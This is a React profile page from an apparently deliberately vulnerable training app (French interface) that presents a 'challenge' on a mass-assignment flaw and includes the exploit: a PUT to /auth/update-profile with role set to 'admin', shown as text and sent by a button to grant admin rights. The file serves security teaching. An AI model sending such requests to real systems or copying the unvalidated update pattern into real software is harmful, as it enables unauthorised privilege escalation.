import React, { useState } from 'react';
import Navbar from '../components/Navbar';
import { useAuth } from '../contexts/AuthContext';
import axios from '../api/axios';
import { User, Shield, Calendar, Star, AlertTriangle } from 'lucide-react';

const ProfilePage = () => {
  const { user, refreshUser } = useAuth();
  const [showExploit, setShowExploit] = useState(false);
  const [exploiting, setExploiting] = useState(false);
  const [message, setMessage] = useState('');

  const handleMassAssignmentExploit = async () => {
    setExploiting(true);
    setMessage('');

    try {
      // Tentative d'exploitation de la vulnérabilité Mass Assignment
      const response = await axios.put('/auth/update-profile', {
        role: 'admin', // Champ malveillant !
      });

      if (response.data.role === 'admin') {
        setMessage('✅ Exploitation réussie ! Vous êtes maintenant administrateur !');
        await refreshUser();
      } else {
        setMessage('❌ L\'exploitation a échoué.');
      }
    } catch (error) {
      setMessage('❌ Erreur: ' + (error.response?.data?.detail || error.message));
    } finally {
      setExploiting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <Navbar />

      <div className="max-w-4xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        <div className="bg-white rounded-xl shadow-md overflow-hidden">
          {/* Header */}
          <div className="bg-gradient-to-r from-purple-600 to-indigo-600 px-8 py-12">
            <div className="flex items-center space-x-4">
              <div className="bg-white p-4 rounded-full">
                <User className="h-16 w-16 text-purple-600" />
              </div>
              <div className="text-white">
                <h1 className="text-3xl font-bold">{user?.username}</h1>
                <p className="text-purple-100 flex items-center mt-2">
                  <Shield className="h-5 w-5 mr-2" />
                  {user?.role === 'admin' ? 'Administrateur' : 'Utilisateur'}
                </p>
              </div>
            </div>
          </div>

          {/* Profile Info */}
          <div className="px-8 py-6">
            <h2 className="text-2xl font-bold text-gray-900 mb-6">Informations du profil</h2>

            <div className="space-y-4">
              <div className="flex items-center justify-between py-3 border-b">
                <span className="text-gray-600 font-medium">Nom d'utilisateur</span>
                <span className="text-gray-900 font-semibold">{user?.username}</span>
              </div>

              <div className="flex items-center justify-between py-3 border-b">
                <span className="text-gray-600 font-medium">Rôle</span>
                <span className={`px-3 py-1 rounded-full text-sm font-semibold ${
                  user?.role === 'admin' 
                    ? 'bg-red-100 text-red-700' 
                    : 'bg-blue-100 text-blue-700'
                }`}>
                  {user?.role === 'admin' ? '👑 Admin' : '👤 User'}
                </span>
              </div>

              <div className="flex items-center justify-between py-3 border-b">
                <span className="text-gray-600 font-medium">Statut</span>
                <span className={`px-3 py-1 rounded-full text-sm font-semibold ${
                  user?.is_active 
                    ? 'bg-green-100 text-green-700' 
                    : 'bg-gray-100 text-gray-700'
                }`}>
                  {user?.is_active ? '✓ Actif' : '✗ Inactif'}
                </span>
              </div>

              <div className="flex items-center justify-between py-3 border-b">
                <span className="text-gray-600 font-medium">Date de création</span>
                <span className="text-gray-900 flex items-center">
                  <Calendar className="h-4 w-4 mr-2" />
                  {user?.created_at ? new Date(user.created_at).toLocaleDateString('fr-FR') : 'N/A'}
                </span>
              </div>

              <div className="flex items-center justify-between py-3">
                <span className="text-gray-600 font-medium">Jokers disponibles</span>
                <div className="flex items-center space-x-2">
                  <Star className={`h-5 w-5 ${user?.joker_1 ? 'text-yellow-500' : 'text-gray-300'}`} />
                  <Star className={`h-5 w-5 ${user?.joker_2 ? 'text-yellow-500' : 'text-gray-300'}`} />
                  <Star className={`h-5 w-5 ${user?.joker_3 ? 'text-yellow-500' : 'text-gray-300'}`} />
                </div>
              </div>
            </div>
          </div>

          {/* Mass Assignment Exploit Section */}
          {user?.role !== 'admin' && (
            <div className="px-8 py-6 bg-gray-50 border-t">
              <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-4">
                <div className="flex items-start">
                  <AlertTriangle className="h-6 w-6 text-yellow-400 mr-3 flex-shrink-0 mt-0.5" />
                  <div>
                    <h3 className="text-sm font-medium text-yellow-800 mb-2">
                      🎯 Défi: Vulnérabilité Mass Assignment
                    </h3>
                    <p className="text-sm text-yellow-700 mb-3">
                      Cette application contient une vulnérabilité Mass Assignment intentionnelle. 
                      L'endpoint <code className="bg-yellow-100 px-1 rounded">/auth/update-profile</code> accepte 
                      tous les champs sans validation.
                    </p>
                    <button
                      onClick={() => setShowExploit(!showExploit)}
                      className="text-sm font-medium text-yellow-800 hover:text-yellow-900 underline"
                    >
                      {showExploit ? 'Masquer l\'exploit' : 'Afficher l\'exploit'}
                    </button>
                  </div>
                </div>
              </div>

              {showExploit && (
                <div className="bg-white border border-gray-200 rounded-lg p-6">
                  <h3 className="text-lg font-bold text-gray-900 mb-4">
                    Exploitation de la vulnérabilité
                  </h3>
                  
                  <div className="bg-gray-900 text-green-400 p-4 rounded-lg mb-4 font-mono text-sm">
                    <div>PUT /auth/update-profile</div>
                    <div>Authorization: Bearer &lt;TOKEN&gt;</div>
                    <div className="mt-2">{'{'}</div>
                    <div className="ml-4 text-red-400">"role": "admin"</div>
                    <div>{'}'}</div>
                  </div>

                  <p className="text-sm text-gray-600 mb-4">
                    En envoyant le champ <code className="bg-gray-100 px-1 rounded">role: "admin"</code>, 
                    vous pouvez élever vos privilèges sans autorisation.
                  </p>

                  <button
                    onClick={handleMassAssignmentExploit}
                    disabled={exploiting}
                    className="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-3 px-6 rounded-lg transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    {exploiting ? 'Exploitation en cours...' : '🚀 Exploiter la vulnérabilité'}
                  </button>

                  {message && (
                    <div className={`mt-4 p-4 rounded-lg ${
                      message.includes('✅') 
                        ? 'bg-green-50 border border-green-200 text-green-700' 
                        : 'bg-red-50 border border-red-200 text-red-700'
                    }`}>
                      {message}
                    </div>
                  )}
                </div>
              )}
            </div>
          )}

          {user?.role === 'admin' && (
            <div className="px-8 py-6 bg-green-50 border-t">
              <div className="flex items-center">
                <Shield className="h-8 w-8 text-green-600 mr-3" />
                <div>
                  <h3 className="text-lg font-bold text-green-900">
                    Félicitations ! Vous êtes administrateur
                  </h3>
                  <p className="text-sm text-green-700">
                    Vous avez accès à toutes les fonctionnalités de la plateforme.
                  </p>
                </div>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default ProfilePage;
